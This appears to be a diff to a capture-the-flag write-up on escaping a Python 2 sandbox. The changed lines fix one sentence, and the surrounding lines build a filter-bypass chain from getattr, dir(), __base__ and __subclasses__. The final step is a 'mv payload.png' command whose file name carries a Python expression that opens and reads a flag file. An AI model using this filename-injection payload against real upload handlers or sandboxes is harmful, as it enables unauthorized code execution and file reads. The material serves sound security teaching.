@@ -80,7 +80,7 @@ Okay, we can now write the `__class__` without directly typing it to bypass the 
 >>> getattr((), dir([])[1])
 <type 'tuple'>
 ```
-This translates to `[].__class__`.
+This translates to `().__class__`.
 
 Okay so next we want to append `__base__`.
 
@@ -123,6 +123,7 @@ Adding () to call the `__subclasses__` function.
 >>>
 ```
 Let's combine our payload and upload it to get the flag.
+
 ```mv payload.png "print getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()#.png"```
 
 
